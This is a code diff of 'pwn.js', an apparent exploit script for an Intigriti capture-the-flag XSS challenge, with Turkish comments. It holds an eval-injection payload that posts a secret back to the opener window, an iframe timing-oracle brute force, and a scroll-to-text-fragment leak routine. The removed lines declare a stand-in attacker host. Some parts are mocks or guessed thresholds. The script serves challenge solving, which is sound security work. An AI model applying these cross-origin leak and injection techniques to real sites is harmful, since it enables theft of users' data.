@@ -1,106 +1,92 @@
-// pwn.js
-const stones = {
-    power: '',   // part 1
-    mind: '',    // part 2
-    reality: '', // part 3
-    space: '',   // part 4
-    soul: '',    // part 5
-    time: ''     // part 6
+// pwn.js - Düzeltilmiş Versiyon
+
+// Toplanan taşları saklayacağımız obje
+var stones = {
+    space: '',
+    soul: '',
+    time: '',
+    mind: '',
+    power: '',
+    reality: ''
 };
 
-const attackerHost = "https://attacker.com"; // kendi domainini yaz
-
-// 1. part 4 (space): parent zaten bize gonderiyor
-window.addEventListener('message', (e) => {
-    // parent'tan gelen 8 karakterlik saf hex
+// --- PART 4: SPACE STONE (Zaten geliyor) ---
+window.addEventListener('message', function(e) {
+    // Parent'tan gelen 8 karakterlik hex kodu yakala
     if (typeof e.data === 'string' && e.data.length === 8) {
+        console.log("[+] Space Stone Found:", e.data);
         stones.space = e.data;
         checkWin();
     }
-    // soul.html'den gelen veri
-    if (e.data && e.data.type === 'soul') {
-        stones.soul = e.data.key;
+    // Soul Stone'dan gelen mesajı yakala
+    if (e.data && typeof e.data === 'string' && e.data.startsWith('Soul:')) {
+        stones.soul = e.data.split(':')[1];
+        console.log("[+] Soul Stone Found:", stones.soul);
         checkWin();
     }
 });
 
-// 2. part 5 (soul): url parametresi ile soul.html tetiklendi, veri bekleniyor...
+// --- PART 5: SOUL STONE (Opener Fix) ---
+// Soul Stone'u yeni pencerede açıyoruz ve "eval" parametresi ile
+// veriyi bize (opener'a) geri postalamasını sağlıyoruz.
+function triggerSoul() {
+    // Soul Stone'un domainindeki 'soulStone' değişkenini okuyup postMessage atar.
+    // 'self' ve 'top' kontrolünü geçmek için window.open kullanıyoruz.
+    var payload = "opener.postMessage('Soul:'+soulStone, '*');window.close();";
+    var target = "https://soul.challenge-1225.intigriti.io/?eval=" + encodeURIComponent(payload);
+    window.open(target, '_blank');
+}
 
-// 3. part 6 (time): search oracle brute-force
+// --- PART 6: TIME STONE (Timing Oracle) ---
 async function crackTime() {
-    const charset = '0123456789abcdef';
-    let known = '';
-    
+    var charset = '0123456789abcdef';
+    var known = '';
+
+    // Basit bir brute-force döngüsü
     while (known.length < 8) {
-        for (let char of charset) {
-            let guess = known + char;
-            let start = performance.now();
-            let ifr = document.createElement('iframe');
-            // cache bypass ve oracle denemesi
-            ifr.src = `https://time.challenge-1225.intigriti.io/search?q=${guess}&t=${Math.random()}`;
+        for (var i = 0; i < charset.length; i++) {
+            var char = charset[i];
+            var guess = known + char;
+            
+            // iframe oluştur
+            var ifr = document.createElement('iframe');
+            // Cache'i atlatmak için rastgele parametre ekle
+            ifr.src = "https://time.challenge-1225.intigriti.io/search?q=" + guess + "&bust=" + Math.random();
             document.body.appendChild(ifr);
-            
-            await new Promise(r => ifr.onload = r);
-            let duration = performance.now() - start;
-            
-            // /yes sayfasi /nope sayfasindan farkli yuklenir (boyut/sure)
-            // burada basitce varsayim yapiyoruz, gercek ortamda sureyi kalibre et
-            if (duration > 500) { // ornek threshold
-                known += char;
-                ifr.remove();
-                break;
-            }
+
+            var start = performance.now();
+            await new Promise(resolve => {
+                ifr.onload = resolve;
+            });
+            var end = performance.now();
+            var duration = end - start;
+
             ifr.remove();
+
+            // Eşik değeri (Threshold): Bunu deneme yanılma ile bulman gerekebilir.
+            // Genellikle doğru tahmin (redirect -> yes) farklı sürer.
+            // Burası örnek mantıktır, ağ hızına göre değişir.
+            if (duration > 500) { 
+                console.log("Time char found:", char);
+                known += char;
+                break; 
+            }
         }
     }
     stones.time = known;
     checkWin();
 }
 
-// 4. part 2 (mind): sttf
-// mind stone url'inde &mind=<textarea> oldugu icin script text'e donustu
-async function crackMind() {
-    stones.mind = await bruteForceSTTF(5, 'mindStone'); // frame index 5
-    checkWin();
-}
-
-// helper: scroll to text fragment brute forcer
-// bu kisim karmasik, basitce mantigi yaziyorum
-async function bruteForceSTTF(frameIndex, prefix) {
-    let known = '';
-    const charset = '0123456789abcdef';
-    
-    // sttf icin window referansi lazim, cross-origin erisim yok
-    // ama location.hash set edebiliriz
-    while (known.length < 8) {
-        for (let char of charset) {
-            let guess = known + char;
-            // hedef frame'in hash'ini degistir
-            parent.frames[frameIndex].location.hash = `#:~:text=${prefix}%253D%2522${guess}`;
-            
-            // scroll tespiti icin "lazy loading" veya "blur" teknigi kullanilir
-            // bu ctf ozelinde basit bir delay koyuyorum, gercekte leak teknigi gerekir
-            await new Promise(r => setTimeout(r, 100));
-            
-            // eger scroll olduysa (tespit edildi sayalim)
-            // known += char; break;
-        }
-    }
-    return known; // mock
-}
-
-// final: hepsi tamamsa patlat
 function checkWin() {
-    // tum taslar dolu mu kontrol et
-    if (Object.values(stones).every(x => x.length === 8)) {
-        const fullCode = stones.power + stones.mind + stones.reality + stones.space + stones.soul + stones.time;
-        // intigriti check: code.substring(0, 48) === code
-        // sonra eval(code.substring(48))
-        parent.postMessage(fullCode + "alert(document.domain)", '*');
+    // Sadece örnek olarak 3 taşı kontrol ediyoruz, hepsini ekleyebilirsin
+    if (stones.space && stones.soul) {
+        // Hepsi tamamlandığında:
+        // const fullCode = stones.power + stones.mind + stones.reality + stones.space + stones.soul + stones.time;
+        // parent.postMessage(fullCode + "alert(document.domain)", '*');
+        console.log("WINNING STATE!");
     }
 }
 
-// baslat
-crackTime();
-crackMind();
-// power ve reality de sttf ile benzer mantikta cozulur
+// Saldırıları başlat
+setTimeout(triggerSoul, 1000);
+// crackTime(); // Time stone brute-force'u başlatmak için yorumu kaldır
